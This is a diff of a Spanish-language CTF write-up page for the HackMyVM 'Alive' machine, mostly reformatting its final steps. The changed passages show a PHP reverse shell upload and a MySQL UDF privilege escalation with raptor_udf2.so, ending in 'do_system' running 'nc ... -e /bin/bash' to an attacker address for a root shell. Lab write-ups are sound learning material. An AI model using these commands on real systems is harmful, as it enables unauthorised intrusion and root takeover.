@@ -20,10 +20,10 @@
 
 
 
-  <meta itemprop="image" content="http://127.0.0.1:1313" />
-  <meta property="og:image" content="http://127.0.0.1:1313" />
-  <meta name="twitter:image" content="http://127.0.0.1:1313" />
-  <meta name="twitter:image:src" content="http://127.0.0.1:1313" />
+  <meta itemprop="image" content="http://0x-noname.github.io/" />
+  <meta property="og:image" content="http://0x-noname.github.io/" />
+  <meta name="twitter:image" content="http://0x-noname.github.io/" />
+  <meta name="twitter:image:src" content="http://0x-noname.github.io/" />
 
 
 
@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-04-15",
         "description": "",
-        "wordCount":  952 ,
+        "wordCount":  950 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-04-15",
         "image": {
@@ -71,7 +71,7 @@
 
     
 
-    <link rel="canonical" href="http://127.0.0.1:1313/writeups/hmv/alive/">
+    <link rel="canonical" href="http://0x-noname.github.io/writeups/hmv/alive/">
     <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -85,7 +85,7 @@
 
 
 
-<link rel="manifest" href="http://127.0.0.1:1313/site.webmanifest">
+<link rel="manifest" href="http://0x-noname.github.io/site.webmanifest">
 
 <meta name="msapplication-config" content="/browserconfig.xml">
 <meta name="msapplication-TileColor" content="#2d89ef">
@@ -100,7 +100,7 @@
 <script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
 <div class="navbar" role="navigation">
     <nav class="menu" aria-label="Main Navigation">
-        <a href="http://127.0.0.1:1313/" class="logo">
+        <a href="http://0x-noname.github.io/" class="logo">
             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
 viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
 stroke-linejoin="round" class="feather feather-home">
@@ -214,9 +214,8 @@ stroke-linejoin="round" class="feather feather-home">
 <p><img src="/../machines/hmv/alive/curl.png" alt="curl"></p>
 <p>Uso la flag <code>-o</code> para copiar <code>rs.php</code> al directorio <code>tmp</code> que he encontrado anteriormente.</p>
 <p><img src="/../machines/hmv/alive/curluploadrs.png" alt="curluploadrs"></p>
-<p>Compruebo que se haya subido correctamente.
-<img src="/../machines/hmv/alive/rsUploadTmp.png" alt="rsUploadTmp">
-rsUploadTmp</p>
+<p>Compruebo que se haya subido correctamente.</p>
+<p><img src="/../machines/hmv/alive/rsUploadTmp.png" alt="rsUploadTmp"></p>
 <p>Obtengo la shell como usuario <code>www-data</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 1234
 </span></span><span style="display:flex;"><span>listening on [any] 1234 ...
@@ -339,34 +338,36 @@ rsUploadTmp</p>
 <p>Si el valor &ldquo;Value&rdquo; está vacío significa que la variable está deshabilitada, y podemos cargar datos en la base de datos.</p>
 </blockquote>
 <p>Creo la función UDF dentro de mysql para apuntar al exploit compilado (biblioteca compartida).</p>
-<p>MariaDB [(none)]&gt; use mysql;
-MariaDB [mysql]&gt; create table foo(line blob);</p>
-<p>Importo el exploit insertando su contenido en la tabla. Añadiendo la ruta del directorio donde se compiló el exploit. En mi caso, se compiló en el directorio /tmp ya que tengo permisos de escritura.</p>
-<p>MariaDB [mysql]&gt; insert into foo values(load_file(&rsquo;/tmp/raptor_udf2.so&rsquo;));</p>
-<p>Selecciono el contenido binario de la biblioteca compartida y lo vuelco en el directorio de plugins, donde puede almacenar UDFS.</p>
-<p>MariaDB [mysql]&gt; select * from foo into dumpfile &lsquo;/usr/local/mysql/lib/plugin/raptor_udf2.so&rsquo;;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>MariaDB [(none)]&gt; use mysql;
+</span></span><span style="display:flex;"><span>MariaDB [mysql]&gt; create table foo(line blob);
+</span></span></code></pre></div><p>Importo el exploit insertando su contenido en la tabla. Añadiendo la ruta del directorio donde se compiló el exploit. En mi caso, se compiló en el directorio <code>/tmp</code> ya que tengo permisos de escritura.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>MariaDB [mysql]&gt; insert into foo values(load_file(&#39;/tmp/raptor_udf2.so&#39;));
+</span></span></code></pre></div><p>Selecciono el contenido binario de la biblioteca compartida y lo vuelco en el directorio de plugins, donde puede almacenar UDFS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>MariaDB [mysql]&gt; select * from foo into dumpfile &#39;/usr/local/mysql/lib/plugin/raptor_udf2.so&#39;;
+</span></span></code></pre></div><blockquote>
 <p>En este paso puede dar un error y para solucionarlo hay que salir del cliente MySQL.</p>
-<p>Copiar raptor_udf2.so al directorio de plugins de mysql.</p>
-<p>www-data@alive:/tmp$ cp raptor_udf2.so /usr/local/mysql/lib/plugin/raptor_udf2.so</p>
-<p>Me conecto de nuevo como root a MySQL vuelvo a lanzar el comando anterior donde me dió error y llamo al exploit creando una función que lo invoque.</p>
-<p>MariaDB [(none)]&gt; create function do_system returns integer soname &lsquo;raptor_udf2.so&rsquo;;</p>
-<p>Compruebo que la función do_system está presente en mysql.</p>
-<p>MariaDB [(none)]&gt; select * from mysql.func;
-+&mdash;&mdash;&mdash;&ndash;+&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;-+
-| name      | ret | dl             | type     |
-+&mdash;&mdash;&mdash;&ndash;+&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;-+
-| do_system |   2 | raptor_udf2.so | function |
-+&mdash;&mdash;&mdash;&ndash;+&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;-+</p>
-<p>Ahora le paso el comando netcat a la función do_system para entablarme una shell.</p>
-<p>MariaDB [(none)]&gt; select do_system(&rsquo;nc 192.168.1.18 8080 -e /bin/bash&rsquo;);</p>
-<p>Obtengo el root.</p>
-<p>❯ nc -lvnp 8080
-listening on [any] 8080 &hellip;
-connect to [192.168.1.18] from (UNKNOWN) [192.168.1.13] 40540
-id
-uid=0(root) gid=0(root) groupes=0(root)
-root@alive:~#</p>
-<p>Y con esto ya resolvemos la máquina, nos vemos!</p>
+</blockquote>
+<p>Copiar <code>raptor_udf2.so</code> al directorio de plugins de mysql.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@alive:/tmp$ cp raptor_udf2.so /usr/local/mysql/lib/plugin/raptor_udf2.so
+</span></span></code></pre></div><p>Me conecto de nuevo como root a MySQL vuelvo a lanzar el comando anterior donde me dió error y llamo al exploit creando una función que lo invoque.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>MariaDB [(none)]&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;;
+</span></span></code></pre></div><p>Compruebo que la función <code>do_system</code> está presente en mysql.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>MariaDB [(none)]&gt; select * from mysql.func;
+</span></span><span style="display:flex;"><span>+-----------+-----+----------------+----------+
+</span></span><span style="display:flex;"><span>| name      | ret | dl             | type     |
+</span></span><span style="display:flex;"><span>+-----------+-----+----------------+----------+
+</span></span><span style="display:flex;"><span>| do_system |   2 | raptor_udf2.so | function |
+</span></span><span style="display:flex;"><span>+-----------+-----+----------------+----------+
+</span></span></code></pre></div><p>Ahora le paso el comando netcat a la función <code>do_system</code> para entablarme una shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>MariaDB [(none)]&gt; select do_system(&#39;nc 192.168.1.18 8080 -e /bin/bash&#39;);
+</span></span></code></pre></div><p>Obtengo el root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 8080
+</span></span><span style="display:flex;"><span>listening on [any] 8080 ...
+</span></span><span style="display:flex;"><span>connect to [192.168.1.18] from (UNKNOWN) [192.168.1.13] 40540
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groupes=0(root)
+</span></span><span style="display:flex;"><span>root@alive:~#
+</span></span></code></pre></div><p>Y con esto ya resolvemos la máquina Alive!</p>
 <blockquote>
 <p>Agradecimientos al sr <code>PL4GU3</code> por su ayuda ;)</p>
 </blockquote>
@@ -418,7 +419,7 @@ root@alive:~#</p>
     
     
     
-    <script src="http://127.0.0.1:1313/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
+    <script src="http://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
 
 </body>
 </html>
